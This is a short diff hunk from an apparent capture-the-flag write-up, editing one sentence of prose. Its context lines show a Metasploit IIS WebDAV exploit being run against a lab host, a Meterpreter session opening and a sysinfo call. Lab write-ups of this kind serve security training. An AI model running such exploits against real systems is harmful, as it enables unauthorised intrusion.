@@ -285,7 +285,7 @@ msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
 [*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
 ```
 
-Boom, we pwned the system! We have access to the victim server! Get some info from it using `sysinfo`:
+Boom, we pwned the system! Get some info from it using `sysinfo`:
 ```
 meterpreter > sysinfo
 Computer        : GRANPA
